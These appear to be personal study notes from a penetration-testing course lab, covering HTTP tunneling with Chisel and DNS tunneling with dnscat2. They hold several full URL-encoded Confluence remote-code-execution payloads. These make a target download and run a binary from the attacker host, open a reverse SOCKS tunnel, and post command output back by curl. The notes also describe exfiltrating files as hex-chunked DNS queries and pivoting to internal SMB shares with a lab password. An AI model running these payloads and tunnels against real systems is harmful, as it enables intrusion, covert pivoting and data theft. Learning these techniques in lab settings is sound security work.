# HTTP Tunneling Theory and Practice

### HTTP Tunneling with Chisel

*Chisel*
- HTTP tunneling tool that encapsulates our data stream within HTTP
	- Also uses the SSH protocol within the tunnel so our data will be encrypted
		- (i.e HTTP Tunnel + SSH-encrypted)
- *reverse port forwarding* -> similar to SSH remote port forwarding
- ![[Pasted image 20240124204519.png]]

- Server & Client use same binary -> different startup arg (server/cleint)
	- [If our target host is running a different operating system or architecture, we have to download and use the compiled binary for that specific operating system and architecture from the Chisel Github releases page]

- Example:
	- [TO SOLVE THIS EXAMPLE]
		- [I had to uninstall chisel --> install the 32 bit Linux version of chisel ---> upload 32 bit version to the tgt machine ---> then it worked]
	- Leverage the injection to download it from our Kali machine over HTTP
		- Serve the **chisel** binary using Apache2
			- ```sudo cp $(which chisel) /var/www/html/```
			- ```sudo systemctl start apache2```
	- Command to download the **chisel** binary to **/tmp/chisel** and make it executable
		- ```wget 192.168.45.186/chisel -O /tmp/chisel && chmod +x /tmp/chisel```
	- Format **wget** command to work with our **curl** Confluence injection payload to.
			- you can modify the specific parts of the URL-encoded RCE payload that you need to, rather than trying to build a new payload from scratch
		- ```curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.118.4/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/```
	- View **/var/log/apache2/access.log** to confirm
		- ```tail -f /var/log/apache2/access.log```
	- Start chisel server
		- ```chisel server --port 8080 --reverse```
			- --port = bind port /
			- --reverse = reverse port forwarding
	- Run **tcpdump** on our Kali machine to log incoming traffic
		- ```sudo tcpdump -nvvvXi tun0 tcp port 8080```
	- Command to start the Chisel client
		- ```/tmp/chisel client 192.168.45.182:8080 R:socks > /dev/null 2>&1 &```
			- R = reverse tunnel
			- socks = proxy type
			- socks proxy bound to port **1080** by default
	- Convert into Confluence injection payload and execute
		- ```curl http://192.168.195.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.186:8080%20R:socks%27%29.start%28%29%22%29%7D/```
	- Doesnt Work --> Try to read command output on tgt machine --> redirect stdout and stderr to a file, and send file over HTTP back to our Kali
		- Command:
			- ```/tmp/chisel client 192.168.118.4:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://192.168.118.4:8080/```
				- **&>** = redirects all streams to stdout & writes it to **/tmp/output**
				- **--data @/tmp/output** = include data in output file
	- Convert again into injection payload in curl command
		- ```curl http://192.168.238.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.178:8080%20R:socks%20%26%3E%20/tmp/output%20%3B%20curl%20--data%20@/tmp/output%20http://192.168.45.178:8080/%27%29.start%28%29%22%29%7D/```
	- Check tcpdump output to confirm
	- Chisel is trying to use versions 2.32 and 2.34 of **glibc** which the CONFLUENCE01 server does not have.
	- Check version of chisel
		- ```chisel -h```
	- Download older version of chisel
		- ```wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz```
			- or ```https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_386.gz```
		- [compile chisel in different OS or ARCH]
			- cwd = /opt/chisel
				- Windows
					- `GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" .`
						- Note: the `-ldflags="-s -w"` simply makes the binary smaller — The `-w` turns off DWARF and the `-s` turns off Go symbol table.
				- Linux
					- `go build -ldflags="-s -w" .`
					- 
	- Unpack
		- ```gunzip chisel_1.8.1_linux_amd64.gz```
	- Copy to Apache
		- ```sudo cp ./chisel /var/www/html```
	- Run the same Confluence injection payload to download chisel from out Kali to tgt
		- ```curl http://192.168.238.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.45.178/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/```
	- Run Chisel client again on CONFLUENCE01 using the injection
		- ```curl http://192.168.238.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.178:8080%20R:socks%27%29.start%28%29%22%29%7D/```
	- Check tcpdump
	- Check Chisel server log
		- ```chisel server --port 8080 --reverse```
	- Check SOCKS proxy
		- ```ss -ntplu```
	- Connect to the SSH server on PGDATABSE01
	- SSH doesn't offer a generic SOCKS proxy command-line option. Instead, it offers the *ProxyCommand*
	- *ProxyCommand* (SSH config option)
		- accepts a shell command that is used to open a proxy-enabled channel
		- can write to a config file  ->
		- or pass it as a CLI arg with **-o**
		-  [The version of Netcat that ships with Kali cant connect to a SOCKS ot HTTP proxy]
		- *Ncat*
			- Netcat alternative written by the maintainers of Nmap.
		- Install *Ncat*
			- ```sudo apt install ncat```
	- Pass *Ncat* command to **ProxyCommand**
		- ```ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.195.215```
			- **%h** = host
			- **%p** = port
				- (SSH fills in before runtime)
- [TO SOLVE THIS EXAMPLE]
	- [I had to uninstall chisel --> install the 32 bit Linux version of chisel ---> upload 32 bit version to the tgt machine ---> then it worked]

# DNS Tunneling

- DNS
	- Asks DNS recursive resolver server for the DNS address record (A record) of the domain
		- **A** record
			- DNS data type -> contains IPv4 address
		- Resolver holds a list of *root name servers* (There are 13 around the world)
		- Sends DNS query to a root name server
			- (root name server will respond with the address of a DNS name server that's responsible for the **.com** *top-level domain (TLD).
				- TLD name server
		- TLD name server will respond with the *authoritative name server*
		- Resolver then asks the **example.com** authoritative name server for the IPv4 address
		- The authoritative name server replies with the A record for that.
		- Resolver returns response to us
			- Done in UDP
				- UDP/53 = standard
		- Summary:
			- domain query -> DNS resolver (by ISP or google.com) -> Root name server (**TLD name server IP for .com**) -> .com TLD name server (**Authoritative name server IP**)-> Authoritative name server (**IPv4**) -> back to us
	- `with MULTISERVER03 as the DNS server, a request from PGDATABASE01 for the IP address of **www.example.com** would follow the flow shown below.`

![[Pasted image 20240125124147.png]]

	- FELINEAUTHORITY is registered within this network as the authoritative name server for the feline.corp zone.8 We will use it to observe how DNS packets reach an authoritative name server. In particular, we will watch DNS packets being exchanged between PGDATABASE01 and FELINEAUTHORITY.
	- While PGDATABASE01 cannot connect directly to FELINEAUTHORITY, it can connect to MULTISERVER03. MULTISERVER03 is also configured as the DNS resolver server for PGDATABASE01.

![[Pasted image 20240128193039.png]]

- Simulating a DNS setup
	- *DNsmasq*
		- Example:
			- cd ~/dns_tunneling
			- dnsmasq.conf
				- ignores **/etc/resolv.conf** and **/etc/hosts**
				- defines the *auth-zone* and *auth-server* variable
				- Tells Dnsmasq to act as the authoritative name server for the **feline.corp** zone
			- ```sudo dnsmasq -C dnsmasq.conf -d```
				- -C = config file
				- -d = "no daemon" -> run in foreground
			- Set up **tcpdump** to listen on the **ens192** interface for DNS packets on UDP/53, using the capture filter **udp port 53**.
				- ```sudo tcpdump -i ens192 udp port 53```
			- Now that **tcpdump** is listening and **Dnsmasq** is running on FELINEAUTHORITY, move to shell on PGDATABASE01.
			- confirm PGDATABASE01's DNS settings
				- ```resolvectl status```
					- DNS resolution handled by systemd-resolved
			- test DNS
				- ```nslookup exfiltrated-data.feline.corp```
			- [However, it may cache results. If we receive outdated DNS responses, we should try flushing the local DNS cache with **resolvectl flush-caches**. We can also query the DNS server directly by appending the serve address to the nslookup command. For example: **nslookup exfiltrated-data.feline.corp 192.168.50.64**]
			- The tcpdump program on FELINEAUTHORITY captured DNS packets from MULTISERVER03.

					-In this case, we've received a DNS A record request for exfiltrated-data.feline.corp on FELINEAUTHORITY. This happened because MULTISERVER03 determined the authoritative name server for the **feline.corp** zone. All requests for _any_ subdomain of **feline.corp** will be forwarded to FELINEAUTHORITY. We didn't tell Dnsmasq on FELINEAUTHORITY what to do with requests for **exfiltrated-data.feline.corp**, so Dnsmasq just returned an _NXDomain__ response. We can see this flow in the following diagram

![[Pasted image 20240128200025.png]]

- Possible ways to exfiltrate data through DNS
	- Convert a binary file into a long _hex_ string representation, split this string into a series of smaller chunks, then send each chunk in a DNS request for **[hex-string-chunk].feline.corp**.
	- On the server side, we could log all the DNS requests and convert them from a series of hex strings back to a full binary
- Possible ways to infiltrate data through DNS
	- One of these is the _TXT record_. The TXT record is designed to be general-purpose, and contains "arbitrary string information"
		- Example:
			- cat dnsmasq_txt.conf
			- Adding to config file:
				- ``` #Define the zone
					auth-zone=feline.corp
					auth-server=feline.corp
					 #TXT record
					txt-record=www.feline.corp,here's something useful!
					txt-record=www.feline.corp,here's something else less useful.```
			- Startup dnsmasq
				- ```sudo dnsmasq -C dnsmasq_txt.conf -d```
			- Test new DNS TXT record
				- ```nslookup -type=txt www.feline.corp```
	- If we wanted to infiltrate binary data, we could serve it as a series of _Base64_ or _ASCII hex encoded_ TXT records, and convert that back into binary on the internal server

### DNS Tunneling with dnscat2

- *dnscat2*
	- xfiltrate data with DNS subdomain queries and infiltrate data with TXT (and other) records.
	- A dnscat2 server runs on an authoritative name server for a particular domain, and clients (which are configured to make queries to that domain) are run on compromised machines
	- Example:
		- inspect traffic from FELINEAUTHORITY
			- ```sudo tcpdump -i ens192 udp port 53```
		- run **dnscat2-server**, passing the **feline.corp** domain as the only argument.
			- ```dnscat2-server feline.corp```
		- Now that our server is set up, we'll move to PGDATABASE01 to run the **dnscat2** **client** binary
			- ```cd dnscat/```
			- ```./dnscat feline.corp```
		- We can check for connections back on our dnscat2 server.
			- ```dnscat2> New window created: 1```
		- Our session is connected! DNS is working exactly as expected. Requests from PGDATABASE01 are being resolved by MULTISERVER03, and end up on FELINEAUTHORITY.
				- `When run without a pre-shared _--secret_ flag at each end, dnscat2 will print an _authentication string_. This is used to verify the connection integrity after the encryption has been negotiated. Every time a connection is made, the authentication string will change.`
		- We can use our tcpdump process to monitor the DNS requests to **feline.corp**:
		- Now we'll start interacting with our session from the dnscat2 server.
			- List active windows
				- `windows`
			- Interact with Command Window
				- `window -i 1`
			- List all commands
				- `?`
				- `--help`
		- We can use **listen** to set up a listening port on our dnscat2 server, and push TCP traffic through our DNS tunnel, where it will be decapsulated and pushed to a socket we specify.
			- Let's background our _console session_ by pressing **`CTRL + Z`**
			- in the _command session_, let's run **listen --help**.
			- `listen --help`
				- **listen** operates much like **ssh -L**.
		- Let's try to connect to the SMB port on HRSHARES, this time through our DNS tunnel.
		- We'll set up a local port forward, listening on 4455 on the loopback interface of FELINEAUTHORITY, and forwarding to 445 on HRSHARES.
			- ```listen 127.0.0.1:4455 172.16.195.217:445```
		- From another shell on FELINEAUTHORITY we can list the SMB shares through this port forward.
			- ```smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234```
		- Our SMB packets are being transported through the dnscat2 DNS tunnel. TCP-based SMB packets, encapsulated in DNS requests and responses transported over UDP, are pinging back and forth to the SMB server on HRSHARES, deep in the internal network. Excellent
		- PG 10.4.226.215
		- CONF 192.168.226.63
		
